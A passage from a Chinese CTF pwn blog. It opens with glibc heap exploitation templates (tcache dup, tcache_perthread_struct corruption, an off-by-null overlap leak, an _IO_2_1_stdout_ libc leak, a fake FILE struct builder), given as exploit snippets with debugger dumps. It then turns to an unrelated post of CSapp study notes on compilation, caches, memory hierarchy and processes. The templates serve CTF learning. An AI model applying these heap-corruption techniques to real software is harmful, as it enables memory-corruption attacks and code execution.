<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(index)</span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">edit(index,p64(target))</span><br><span class="line">add(size)</span><br><span class="line">add(size) <span class="comment"># malloc the target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>释放 chunk ，覆盖 “chunk-&gt;FD，chunk-&gt;BK” 为“\x00” ，再次释放</li>
<li>利用修改模块覆写上 target</li>
<li>连续两次申请获取 target</li>
</ul>
<p><strong>Tcache perthread corruption</strong></p>
<p>一，打 count 获取 unsorted chunk：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(index) <span class="comment"># Tcache dup</span></span><br><span class="line">edit(index,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(index)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x0007000000000000</span>) <span class="comment"># cover count to &#x27;7&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(index,p64(heap_base + <span class="number">0x10</span>)) <span class="comment"># tcache_perthread_struct-&gt;next</span></span><br><span class="line">add(size)</span><br><span class="line">add(size,payload) <span class="comment"># malloc the tcache_perthread_struct</span></span><br><span class="line">delete(index)</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：tcache-&gt;next 和常规的FD指针相似但不同，FD指向 nextchunk-&gt;presize ，而 next 指向 nextchunk-&gt;next </li>
<li>利用 Tcache dup 申请到“tcache_perthread_struct”（第一个chunk）</li>
<li>修改对应“tcache_perthread_struct-&gt;size”的“count”为“7”（偏移可以在GDB中看）</li>
<li>释放“tcache_perthread_struct”使其进入“unsortedbin”</li>
</ul>
<p>二，打 tcache_entry 劫持 tcachebin：</p>
<p>这个很灵活，不好用代码表示，这里我挂上几个堆风水：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, p16(<span class="built_in">stdout</span>))</span><br><span class="line">add(<span class="number">0x58</span>, p64(<span class="number">0xfdad2887</span> | <span class="number">0x1000</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + b<span class="string">&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// add</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// delete</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x558b1cfcd0b0</span> ◂— <span class="number">0x7fef51cc13cd</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x558b1cfcd060</span> ◂— <span class="number">0x1f1</span> </span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x7fea097ddc00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x558ce25c44cd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意：因为 tcache 的性质，在对应“size的tcache”中写入地址，就会申请这个地址作为“tcache-&gt;next”（也就是说，数据会直接写入该地址）</li>
<li>关键在于：使 <code>&#39;0x40&#39; tcache</code> 中装有 <code>&#39;0x50&#39; tcache addr</code> ，使其可以通过申请“0x30”来修改 <code>&#39;0x50&#39; tcache</code> 的地址（劫持大小为“0x50”的tcachebin）</li>
</ul>
<h2 id="Off-By-Null模板（基于read）"><a href="#Off-By-Null模板（基于read）" class="headerlink" title="Off-By-Null模板（基于read）"></a>Off-By-Null模板（基于read）</h2><p>有些程序为了“打印模块”的安全性，会在read完成后加一个“\x00”，造成了off-by-null</p>
<p>例如：<em>( </em>(&amp;list + index)  + read(0, *(&amp;list + index) , size) ) = 0 </p>
<p><strong>有Tcache：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">	add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF0</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">	delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>覆盖前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55a67dfb3450</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x0000000000000101</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x55a67dfb3460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55a67dfb3470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x561f0e5bf450</span>:	<span class="number">0x0000000000000200</span>	<span class="number">0x0000000000000100</span> # chunk2(allocated)</span><br><span class="line"><span class="number">0x561f0e5bf460</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x561f0e5bf470</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>
<p>导致程序误以为chunk0(free)是chunk2相邻的上一个chunk，在释放chunk2后，会导致chunk0，chunk1，chunk2，三者合并为free_chunk</p>
<p>两次申请“0x80”大小的chunk后，free_chunk刚好和chunk1_old重合，把“arena_main + xx”写入chunk1_old，这之后就可以利用“打印模块”进行泄露了</p>
<h2 id="IO-2-1-stdout-Leak-模板"><a href="#IO-2-1-stdout-Leak-模板" class="headerlink" title="IO_2_1_stdout Leak 模板"></a>IO_2_1_stdout Leak 模板</h2><p><strong>基于 Double free</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span>	</span><br><span class="line">    <span class="comment"># lead target to chunk2</span></span><br><span class="line">    add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	add(<span class="number">0x90</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,padding) <span class="comment"># cover &quot;chunk0-&gt;FD&quot; to make chunk1 into fastbin</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># can change</span></span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># malloc the target</span></span><br><span class="line">	libc_base=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure>
<ul>
<li>整个过程在循环中进行，有 1/16 的概率可以成功</li>
<li>把 chunk1 放入 unsortedbin 然后覆盖 main_arena 为 target</li>
<li>进行 Double free ，然后覆盖“chunk0-&gt;FD”，使其指向 chunk1</li>
<li>申请 target 修改 <code>_IO_2_1_stdout_</code> 的“flag”为“0xfbad1800”，将后面三个read指针置空，将 <code>_IO_write_base</code> 处的第一个字节改为“0”</li>
</ul>
<p>这里一定是：先覆盖 main_arena ，后 Double free 把它链入 fastbin</p>
<h2 id="FILE结构体模板"><a href="#FILE结构体模板" class="headerlink" title="FILE结构体模板"></a>FILE结构体模板</h2><p>这个模板主要是个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br></pre></td></tr></table></figure>
<p>用它可以快速伪造 FILE 结构体</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">从CSapp中收获的知识（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-01 02:25:43" itemprop="dateCreated datePublished" datetime="2022-01-01T02:25:43+08:00">2022-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-18 23:47:50" itemprop="dateModified" datetime="2022-05-18T23:47:50+08:00">2022-05-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>32k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>29 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="从CSapp中收获的知识"><a href="#从CSapp中收获的知识" class="headerlink" title="从CSapp中收获的知识"></a>从CSapp中收获的知识</h2><p><strong>CSapp</strong>是一本很好的书，它像极了一本“技术字典”，知识十分全面但又不深入，对学习计算机有着引领性的作用</p>
<p>我学习<strong>CSapp</strong>已经有一段时间了，有些章节可以调起我的兴趣，使我在网络上进行了知识扩充，但有些章节用大段大段的文字来劝退我，甚至还有一些章节玩起了“高数”，搞得我很懵逼</p>
<p><strong>CSapp</strong>上的知识太杂，太广，我感觉好多知识我都没法利用上（或许以后用得上），我害怕搞忘了这些知识，于是我也做过章节总结，但是我发现这样做的效率并不高，所以我打算不以章节为单位进行总结，而是把知识拆分为小块，逐一记录</p>
<hr>
<h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641111569636-1646286364492-1646808754595-1646808862601.png" class width="1641111569636"> 
<h2 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639405451872-1640399662182-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639405451872"> 
<p>文字版本如下：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640400471882-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1640400471882"> 
<h2 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h2><p>编译器驱动程序的工作：调用语言预处理器，编译器，汇编器，链接器</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641118618666-1646286364492-1646808754595-1646808862601.png" class width="1641118618666"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646665002297-1646808754595-1646808862601.png" class width="1646665002297"> 
<p>详细过程：</p>
<ul>
<li><strong>预处理阶段</strong>：预处理器（cpp）根据以字符 “#” 开头的命令，修改原始的 C 程序（比如 hello.c 中第 1 行的<code>#include</code>命令告诉预处理器读取系统头文件 stdio.h 的内容）并把它直接插入程序文本中，结果就得到了另一个 C 程序<ul>
<li>通常是以 .i 作为文件扩展名</li>
<li>所谓的头文件，里面装的其实就是函数声明（libc库中的函数：scanf，printf 等）</li>
</ul>
</li>
<li><strong>编译阶段</strong>：编译器（ccl）将文本文件 hello.i 翻译成文本文件 hello.s，它包含一个汇编语言程序<ul>
<li>.s 文件其实就是装有汇编语言的文件</li>
</ul>
</li>
<li><strong>汇编阶段</strong>：汇编器（as）将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o 中<ul>
<li>hello.o 文件是一个二进制文件，它包含的 17 个字节是函数 main 的指令编码</li>
<li>如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码（二进制）</li>
</ul>
</li>
<li><strong>链接阶段</strong>：链接器（ld）就负责处理合并各个 hello.o 文件，结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行<ul>
<li>请注意，hello 程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数</li>
<li>printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中</li>
<li>通过修改 hello.o 可以影响最终文件 hello 的效果</li>
</ul>
</li>
</ul>
<h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>抽象是从众多的事物中抽取出共同的、本质性的<strong>特征</strong></p>
<p><strong>指令集架构</strong>是对 <strong>实际处理器硬件</strong> 的抽象</p>
<p><strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p><strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p><strong>虚拟机</strong>是对 <strong>整个计算机</strong> 的抽象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639413250532-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639413250532"> 
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p><strong>缓存</strong>（cache），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用 <strong>[DRAM]技术</strong> ，而使用昂贵但较快速的 <strong>[SRAM]技术</strong> ，缓存的设置是所有现代计算机系统发挥高性能的重要因素之一</p>
<p>缓存的工作原理是当CPU要读取一个数据时，首先从CPU缓存中查找，找到就立即读取并送给CPU处理，没有找到，就从速率相对较慢的内存中读取并送给CPU处理 </p>
<p><strong>缓存命中</strong></p>
<p>但程序需要在第 <strong>n</strong> 层中查找数据时：它会首先在第 <strong>n-1</strong> 层中查找， 如果数据刚好就在第 <strong>n-1</strong> 层中，就直接使用第 <strong>n-1</strong> 层中的数据，称为<strong>缓存命中</strong></p>
<p>从第 <strong>n-1</strong> 层中读取，要比从第 <strong>n</strong> 层中读取更快</p>
<p><strong>缓存不命中</strong></p>
<p>另一方面，如果程序没有在第 <strong>n-1</strong> 层中查找到数据，那么它便会在第 <strong>n</strong> 层中查找，称为<strong>缓存不命中</strong>，同时会把第 <strong>n</strong> 层的数据写入第 <strong>n-1</strong> 层</p>
<h2 id="内存阶层"><a href="#内存阶层" class="headerlink" title="内存阶层"></a>内存阶层</h2><p>速度快的存储器往往容量小，容量大的储存器往往速度慢</p>
<p>所以综合存储器的优劣，内存阶层的机制出现了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115585515-1646286364492-1646808754595-1646808862601.png" class width="1641115585515"> 
<p>核心思想为：上一层（更快更小）为下一层（更大更慢）的缓存</p>
<p>内存阶层是在电脑架构下储存系统阶层的排列顺序，每一层于下一层相比都拥有较高的速度和较低延迟性，以及较小的容量（也有少量例外）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:left"><strong>位于哪里</strong></th>
<th style="text-align:left"><strong>存储容量</strong></th>
<th style="text-align:left"><strong>访问时间</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU寄存器</td>
<td style="text-align:left">位于CPU执行单元中</td>
<td style="text-align:left">CPU寄存器通常只有几个到几十个，每个寄存器的容量取决于CPU的字长，所以一共只有几十到几百字节</td>
<td style="text-align:left">寄存器是访问速度最快的存储器，典型的访问时间是几纳秒</td>
</tr>
<tr>
<td>Cache</td>
<td style="text-align:left">和MMU一样位于CPU核中</td>
<td style="text-align:left">Cache通常分为几级，最典型的是如上图所示的两级Cache，一级Cache更靠近CPU执行单元，二级Cache更靠近物理内存，通常一级Cache有几十到几百KB，二级Cache有几百KB到几MB</td>
<td style="text-align:left">典型的访问时间是几十纳秒</td>
</tr>
<tr>
<td>内存</td>
<td style="text-align:left">位于CPU外的芯片，与CPU通过地址和数据总线相连</td>
<td style="text-align:left">典型的存储容量是几百MB到几GB</td>
<td style="text-align:left">典型的访问时间是几百纳秒</td>
</tr>
<tr>
<td>硬盘</td>
<td style="text-align:left">位于设备总线上，并不直接和CPU相连，CPU通过设备总线的控制器访问硬盘</td>
<td style="text-align:left">典型的存储容量是几百GB</td>
<td style="text-align:left">典型的访问时间是几毫秒，是寄存器的“10的6次方”倍</td>
</tr>
</tbody>
</table>
</div>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641117200100-1646286364492-1646808754595-1646808862601.png" class width="1641117200100"> 
<h2 id="管理单元"><a href="#管理单元" class="headerlink" title="管理单元"></a>管理单元</h2><p>计算机常用“扇区”，“簇”，“块”，“页”等概念，这些都是<strong>管理单元</strong></p>
<p><strong>扇区：</strong>（Sector）</p>
<p>扇区，顾名思义，每个磁盘有多条同心圆似的磁道，磁道被分割成多个部分，每部分的弧长加上到圆心的两个半径，恰好形成一个扇形，所以叫做扇区 </p>
<p>扇区是磁盘中最小的物理存储单位（每个扇区的大小是512字节，通常4096字节）</p>
<p><strong>块：</strong>（Block）</p>
<p>块是操作系统中最小的逻辑存储单元（例如内存块的基本组成单元：chunk）</p>
<p><strong>簇：</strong></p>
<p>簇是微软操作系统（DOS、WINDOWS等）中磁盘文件存储管理的最小单位 </p>
<p><strong>块和簇的关系：</strong></p>
<p>在Windows下如NTFS等文件系统中叫做簇</p>
<p>在Linux下如Ext4等文件系统中叫做块</p>
<p>每个簇或者块可以包括2、4、8、16、32、64… “2的n次方” 个扇区 </p>
<p><strong>页：</strong>（page）</p>
<p>页是内存的最小存储单位，页的大小通常为磁盘块大小的 “2的n次方” 倍，是内存操作的基本单位 </p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>操作系统有两目的：</p>
<p>1.防止硬件被失控的应用滥用</p>
<p>2.向应用程序提供简单一致的机制来控制复杂的低级硬件</p>
<p>操作系统通过几个基本的<strong>抽象</strong>概念来实现这两个功能：</p>
<p>1.<strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p>2.<strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p>3.<strong>进程</strong>是对 <strong>处理器，内存，I/O设备</strong> 的抽象</p>
<h2 id="程序计数器-PC"><a href="#程序计数器-PC" class="headerlink" title="程序计数器(PC)"></a>程序计数器(PC)</h2><p>程序计数器（PC）是CPU控制部件中的一种，用于存放指令的地址 </p>
<p>程序计数器是一个概念上的说法，<strong>不同的机型把不同的存储器当成程序计数器</strong></p>
<ul>
<li>8086：IP寄存器  </li>
<li>i386：EIP寄存器</li>
<li>amd64：RIP寄存器</li>
</ul>
<h2 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h2><p>内核可以决定抢占当前进程，并重新开始一个被抢占的进程，这种决策叫做<strong>调度</strong>，是由内核中被称为“调度器”的代码处理的</p>
<p><strong>上下文切换机制</strong>用于：保存“被调度进程”的数据</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>当程序在系统上运行时，操作系统会提供一种 <strong>假象</strong> ，就好像系统上只有这个程序在运行一样，程序看上去是在 <strong>独占</strong> 处理器（该程序是系统资源中唯一的对象）</p>
<p>这些 <strong>假象</strong> 是通过 <strong>进程</strong> 这个概念来实现的</p>
<p>​        //在系统中，各种程序交替执行，而 <strong>进程</strong> 把不同功能的程序 <strong>区分</strong> 开来</p>
<p>在单处理器系统中：</p>
<p>程序想要“并发处理多个进程”时，必须要先保存当前进程的 <strong>上下文</strong> ，然后创建新进程的 <strong>上下文</strong></p>
<p>比如“hello”执行的过程就涉及到两个进程：1.shell    2.hello</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410149675-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639410149675"> 
<p>系统中的每个程序都运行在某个进程的上下文中，上下文就是程序正确运行所需要的状态（包括：存放在内存中的代码和数据，栈和通用寄存器中的内容，程序计数器，环境变量，打开文件描述符的集合）</p>
<p>进程将会提供给应用程序两个关键的抽象：</p>
<ul>
<li>逻辑控制流</li>
<li>私有地址空间</li>
</ul>
<h2 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641872879336-1646286364492-1646808754596-1646808862601.png" class width="1641872879336"> 
<p>实际上：系统中的进程是<strong>交错运行</strong>的，每个进程执行它流的一部分，然后被抢占（暂时挂起），接着轮到其他进程</p>
<p>进程提供的假象：好像每个程序都在<strong>单独地</strong>使用处理器</p>
